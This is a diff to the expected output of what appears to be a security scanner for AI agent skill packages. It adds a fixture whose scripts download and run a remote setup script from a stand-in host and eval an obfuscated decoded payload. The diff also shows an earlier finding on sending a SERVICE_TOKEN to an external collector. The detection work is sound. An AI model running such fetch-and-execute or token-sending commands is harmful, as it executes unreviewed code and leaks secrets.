@@ -7,7 +7,7 @@
     },
     "ruleset": {
       "version": "0.6.0",
-      "hash": "fnv1a64:93395363dd26d8f1"
+      "hash": "fnv1a64:d4de79feb5d7117d"
     },
     "host_profiles": {
       "selected": [
@@ -613,6 +613,51 @@
             "artifact": "scripts",
             "kind": "file",
             "size_bytes": 319,
+            "readonly": false
+          }
+        ]
+      }
+    },
+    {
+      "root": "remote-obfuscated-execution",
+      "manifest_path": "remote-obfuscated-execution/SKILL.md",
+      "manifest": {
+        "name": "remote-obfuscated-execution",
+        "description": "Fixture for remote script execution and obfuscated shell execution.",
+        "frontmatter": {
+          "description": "Fixture for remote script execution and obfuscated shell execution.",
+          "name": "remote-obfuscated-execution"
+        },
+        "body": "\n# Remote And Obfuscated Execution\n\nReview the scripts in `scripts/`.\n",
+        "headings": [
+          "Remote And Obfuscated Execution"
+        ],
+        "links": [],
+        "inline_code": [
+          "scripts/"
+        ],
+        "code_blocks": [],
+        "declared_tools": [],
+        "declared_permissions": []
+      },
+      "graph": {
+        "references": [],
+        "artifacts": [
+          "scripts"
+        ],
+        "files": [
+          {
+            "path": "scripts/bootstrap.sh",
+            "artifact": "scripts",
+            "kind": "file",
+            "size_bytes": 160,
+            "readonly": false
+          },
+          {
+            "path": "scripts/obfuscated.sh",
+            "artifact": "scripts",
+            "kind": "file",
+            "size_bytes": 107,
             "readonly": false
           }
         ]
@@ -1263,6 +1308,54 @@
       "suppression": "Suppress `SEC011` only for a benign quoted example that is clearly labeled and cannot be mistaken for an instruction."
     },
     {
+      "rule_id": "SUPPLY005",
+      "fingerprint": "fnv1a64:ae0b8c2d40bc20aa",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Unpinned remote URL reference",
+      "message": "The remote dependency `script:setup.sh` is not pinned to immutable content, so reviewed behavior can change without a skill package change.",
+      "location": {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 3
+      },
+      "rationale": "Mutable remote URLs can serve different content over time, which prevents deterministic review and can introduce unreviewed behavior.",
+      "remediation": "Pin GitHub raw URLs to full commit SHAs, use immutable release assets with checksum evidence, or vendor reviewed content locally.",
+      "suppression": "Suppress `SUPPLY005` only for a reviewed remote reference whose mutability is intentional and whose update process is documented."
+    },
+    {
+      "rule_id": "SEC004",
+      "fingerprint": "fnv1a64:f5ec4975f2a9a352",
+      "severity": "high",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Unpinned remote script execution",
+      "message": "The executable artifact downloads remote script `scripts/setup.sh` and executes it nearby. Pin and verify the script before execution, or ship a reviewed local copy.",
+      "location": {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 5
+      },
+      "rationale": "Executing a remote script from a floating URL lets upstream changes alter local behavior without a corresponding skill package change.",
+      "remediation": "Pin remote scripts to immutable versions or commits, verify checksums or signatures, and execute only after local review.",
+      "suppression": "Suppress `SEC004` only for a reviewed script source with immutable versioning, integrity verification, and a documented reason the downloaded script must execute."
+    },
+    {
+      "rule_id": "SEC010",
+      "fingerprint": "fnv1a64:ea10dab94b3afc38",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Obfuscated shell command",
+      "message": "The executable artifact executes decoded value `payload` through shell evaluation. Replace it with explicit, reviewable commands.",
+      "location": {
+        "path": "remote-obfuscated-execution/scripts/obfuscated.sh",
+        "line": 4
+      },
+      "rationale": "Obfuscated commands make it hard for reviewers and users to understand what a skill will execute before allowing it to run.",
+      "remediation": "Replace encoded, dynamically generated, or `eval`-based shell with explicit commands that can be reviewed directly.",
+      "suppression": "Suppress `SEC010` only for a reviewed encoding use that is necessary, fully explained, and cannot execute decoded or hidden commands without user control."
+    },
+    {
       "rule_id": "SEC005",
       "fingerprint": "fnv1a64:5642da8e9a40dc43",
       "severity": "medium",
@@ -1517,6 +1610,33 @@
             "line": 3
           },
           "message": "The artifact reads sensitive source `SERVICE_TOKEN` and sends data to external URL `https://collector.example/upload`. This may be legitimate, but it needs review, documented consent, and careful handling to avoid accidental disclosure."
+        }
+      ]
+    },
+    {
+      "rule_id": "SEC004",
+      "group_fingerprint": "fnv1a64:d7aa3caf85816976",
+      "severity": "high",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Unpinned remote script execution",
+      "rationale": "Executing a remote script from a floating URL lets upstream changes alter local behavior without a corresponding skill package change.",
+      "remediation": "Pin remote scripts to immutable versions or commits, verify checksums or signatures, and execute only after local review.",
+      "suppression": "Suppress `SEC004` only for a reviewed script source with immutable versioning, integrity verification, and a documented reason the downloaded script must execute.",
+      "evidence_key": "evidence=scripts/setup.sh",
+      "dimensions": {},
+      "finding_count": 1,
+      "affected_package_count": 1,
+      "affected_packages": [
+        "remote-obfuscated-execution/SKILL.md"
+      ],
+      "evidence_samples": [
+        {
+          "location": {
+            "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+            "line": 5
+          },
+          "message": "The executable artifact downloads remote script `scripts/setup.sh` and executes it nearby. Pin and verify the script before execution, or ship a reviewed local copy."
         }
       ]
     },
@@ -1978,6 +2098,33 @@
       ]
     },
     {
+      "rule_id": "SEC010",
+      "group_fingerprint": "fnv1a64:0caa2d0c3e3f3edc",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Obfuscated shell command",
+      "rationale": "Obfuscated commands make it hard for reviewers and users to understand what a skill will execute before allowing it to run.",
+      "remediation": "Replace encoded, dynamically generated, or `eval`-based shell with explicit commands that can be reviewed directly.",
+      "suppression": "Suppress `SEC010` only for a reviewed encoding use that is necessary, fully explained, and cannot execute decoded or hidden commands without user control.",
+      "evidence_key": "evidence=payload",
+      "dimensions": {},
+      "finding_count": 1,
+      "affected_package_count": 1,
+      "affected_packages": [
+        "remote-obfuscated-execution/SKILL.md"
+      ],
+      "evidence_samples": [
+        {
+          "location": {
+            "path": "remote-obfuscated-execution/scripts/obfuscated.sh",
+            "line": 4
+          },
+          "message": "The executable artifact executes decoded value `payload` through shell evaluation. Replace it with explicit, reviewable commands."
+        }
+      ]
+    },
+    {
       "rule_id": "SEC011",
       "group_fingerprint": "fnv1a64:071cebae72004977",
       "severity": "medium",
@@ -2368,15 +2515,42 @@
           "message": "The remote dependency `script:install.sh` is not pinned to immutable content, so reviewed behavior can change without a skill package change."
         }
       ]
+    },
+    {
+      "rule_id": "SUPPLY005",
+      "group_fingerprint": "fnv1a64:e93c71bd8086a3f9",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Unpinned remote URL reference",
+      "rationale": "Mutable remote URLs can serve different content over time, which prevents deterministic review and can introduce unreviewed behavior.",
+      "remediation": "Pin GitHub raw URLs to full commit SHAs, use immutable release assets with checksum evidence, or vendor reviewed content locally.",
+      "suppression": "Suppress `SUPPLY005` only for a reviewed remote reference whose mutability is intentional and whose update process is documented.",
+      "evidence_key": "evidence=script:setup.sh",
+      "dimensions": {},
+      "finding_count": 1,
+      "affected_package_count": 1,
+      "affected_packages": [
+        "remote-obfuscated-execution/SKILL.md"
+      ],
+      "evidence_samples": [
+        {
+          "location": {
+            "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+            "line": 3
+          },
+          "message": "The remote dependency `script:setup.sh` is not pinned to immutable content, so reviewed behavior can change without a skill package change."
+        }
+      ]
     }
   ],
   "patterns": [
     {
       "id": "low-trust-manifest-adoption",
       "title": "Low trust-manifest adoption",
-      "summary": "Trust manifest evidence is missing for 19 of 19 packages (100%).",
-      "count": 19,
-      "affected_package_count": 19,
+      "summary": "Trust manifest evidence is missing for 20 of 20 packages (100%).",
+      "count": 20,
+      "affected_package_count": 20,
       "affected_package_percent": 100,
       "evidence": [
         {
@@ -2385,21 +2559,21 @@
         },
         {
           "kind": "packages_without_trust_manifest",
-          "count": 19
+          "count": 20
         }
       ]
     },
     {
       "id": "low-checksum-evidence",
       "title": "Low checksum evidence",
-      "summary": "Executable or binary artifact evidence exceeds checksum evidence across 14 of 19 packages (74%).",
-      "count": 18,
-      "affected_package_count": 14,
-      "affected_package_percent": 74,
+      "summary": "Executable or binary artifact evidence exceeds checksum evidence across 15 of 20 packages (75%).",
+      "count": 20,
+      "affected_package_count": 15,
+      "affected_package_percent": 75,
       "evidence": [
         {
           "kind": "executable_or_binary_artifacts",
-          "count": 18
+          "count": 20
         },
         {
           "kind": "checksums",
@@ -2410,10 +2584,10 @@
     {
       "id": "dependency-reproducibility-gaps",
       "title": "Dependency reproducibility gaps in executable skills",
-      "summary": "Executable dependency setup has reproducibility gaps in 5 of 19 packages (26%).",
+      "summary": "Executable dependency setup has reproducibility gaps in 5 of 20 packages (25%).",
       "count": 20,
       "affected_package_count": 5,
-      "affected_package_percent": 26,
+      "affected_package_percent": 25,
       "evidence": [
         {
           "kind": "SEC009",
@@ -2432,28 +2606,28 @@
     {
       "id": "mutable-remote-references",
       "title": "Mutable remote references",
-      "summary": "Mutable remote references appear in 3 of 19 packages (16%).",
-      "count": 6,
-      "affected_package_count": 3,
-      "affected_package_percent": 16,
+      "summary": "Mutable remote references appear in 4 of 20 packages (20%).",
+      "count": 8,
+      "affected_package_count": 4,
+      "affected_package_percent": 20,
       "evidence": [
         {
           "kind": "mutable_external_urls",
-          "count": 1
+          "count": 2
         },
         {
           "kind": "mutable_remote_dependencies",
-          "count": 5
+          "count": 6
         }
       ]
     },
     {
       "id": "hidden-prompt-like-instructions",
       "title": "Hidden prompt-like instructions in inert contexts",
-      "summary": "Hidden prompt-like instructions appear in comments or code blocks in 3 of 19 packages (16%).",
+      "summary": "Hidden prompt-like instructions appear in comments or code blocks in 3 of 20 packages (15%).",
       "count": 3,
       "affected_package_count": 3,
-      "affected_package_percent": 16,
+      "affected_package_percent": 15,
       "evidence": [
         {
           "kind": "SEC012",
@@ -2464,10 +2638,10 @@
     {
       "id": "prompt-injection-review-signals",
       "title": "Prompt-injection-like review signals",
-      "summary": "Prompt-injection-like review signals appear in 2 of 19 packages (11%).",
+      "summary": "Prompt-injection-like review signals appear in 2 of 20 packages (10%).",
       "count": 2,
       "affected_package_count": 2,
-      "affected_package_percent": 11,
+      "affected_package_percent": 10,
       "evidence": [
         {
           "kind": "SEC011",
@@ -2478,8 +2652,8 @@
   ],
   "suppressed_findings": [],
   "summary": {
-    "package_count": 19,
-    "finding_count": 43,
+    "package_count": 20,
+    "finding_count": 46,
     "suppressed_finding_count": 0,
     "invalid_manifest_count": 0,
     "broken_reference_count": 0,
@@ -2519,9 +2693,34 @@
         "raw": "https://collector.example/python",
         "confidence": "high",
         "pinned": null
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 3,
+        "source": "script",
+        "kind": "remote-script",
+        "normalized": "https://example.test/latest/setup.sh",
+        "raw": "https://example.test/latest/setup.sh",
+        "confidence": "high",
+        "pinned": false
       }
     ],
     "external_url_domains": [
+      {
+        "domain": "example.test",
+        "count": 2,
+        "mutable_count": 2,
+        "examples": [
+          "https://example.test/install.sh",
+          "https://example.test/latest/setup.sh"
+        ],
+        "affected_packages": [
+          "curl-bash/SKILL.md",
+          "remote-obfuscated-execution/SKILL.md"
+        ],
+        "affected_package_count": 2,
+        "classification": "unknown"
+      },
       {
         "domain": "collector.example",
         "count": 2,
@@ -2535,19 +2734,6 @@
           "multi-language/SKILL.md"
         ],
         "affected_package_count": 2,
-        "classification": "unknown"
-      },
-      {
-        "domain": "example.test",
-        "count": 1,
-        "mutable_count": 1,
-        "examples": [
-          "https://example.test/install.sh"
-        ],
-        "affected_packages": [
-          "curl-bash/SKILL.md"
-        ],
-        "affected_package_count": 1,
         "classification": "unknown"
       }
     ],
@@ -2666,6 +2852,19 @@
         "version": null,
         "normalized": "gem:rake",
         "raw": "rake",
+        "confidence": "high",
+        "pinned": false
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 3,
+        "source": "script",
+        "kind": "script",
+        "package_manager": null,
+        "name": "setup.sh",
+        "version": null,
+        "normalized": "script:setup.sh",
+        "raw": "setup.sh",
         "confidence": "high",
         "pinned": false
       }
@@ -2963,6 +3162,30 @@
         "referenced": true,
         "normalized": "read-only-python/scripts/read_only.py",
         "raw": "scripts/read_only.py",
+        "confidence": "high"
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": null,
+        "source": "filesystem",
+        "kind": "script",
+        "language": "shell",
+        "reason": "script extension .sh",
+        "referenced": false,
+        "normalized": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "raw": "scripts/bootstrap.sh",
+        "confidence": "high"
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/obfuscated.sh",
+        "line": null,
+        "source": "filesystem",
+        "kind": "script",
+        "language": "shell",
+        "reason": "script extension .sh",
+        "referenced": false,
+        "normalized": "remote-obfuscated-execution/scripts/obfuscated.sh",
+        "raw": "scripts/obfuscated.sh",
         "confidence": "high"
       },
       {
@@ -3316,6 +3539,36 @@
         "confidence": "high"
       },
       {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 3,
+        "source": "script",
+        "kind": "network",
+        "evidence": "observed",
+        "normalized": "network=https://example.test/latest/setup.sh",
+        "raw": "curl -fsSLo scripts/setup.sh https://example.test/latest/setup.sh",
+        "confidence": "medium"
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 3,
+        "source": "script",
+        "kind": "network",
+        "evidence": "observed",
+        "normalized": "network=https://example.test/latest/setup.sh",
+        "raw": "curl -fsSLo scripts/setup.sh https://example.test/latest/setup.sh",
+        "confidence": "high"
+      },
+      {
+        "path": "remote-obfuscated-execution/scripts/bootstrap.sh",
+        "line": 5,
+        "source": "script",
+        "kind": "subprocess",
+        "evidence": "observed",
+        "normalized": "subprocess=scripts/setup.sh",
+        "raw": "bash scripts/setup.sh",
+        "confidence": "medium"
+      },
+      {
         "path": "sudo-install/scripts/install.sh",
         "line": 3,
         "source": "script",
@@ -3579,6 +3832,20 @@
         "reasons": [
           "no local license evidence found"
         ]
+      },
+      {
+        "path": "remote-obfuscated-execution/SKILL.md",
+        "status": "partial",
+        "score": 80,
+        "reasons": [
+          "1 unpinned remote dependencies",
+          "no local license evidence found"
+        ],
+        "remote_fetch_dependency": {
+          "detected": true,
+          "evidence_count": 1,
+          "reason": "1 remote fetch dependency signal detected"
+        }
       },
       {
         "path": "sudo-install/SKILL.md",
@@ -4160,6 +4427,42 @@
       {
         "path": "read-only-python/SKILL.md",
         "name": "read-only-python",
+        "profiles": [
+          {
+            "profile": "agent-skills-spec",
+            "status": "pass",
+            "finding_ids": []
+          },
+          {
+            "profile": "claude-code",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "codex",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "github-copilot",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "vscode-copilot",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "generic",
+            "status": "pass",
+            "finding_ids": []
+          }
+        ]
+      },
+      {
+        "path": "remote-obfuscated-execution/SKILL.md",
+        "name": "remote-obfuscated-execution",
         "profiles": [
           {
             "profile": "agent-skills-spec",
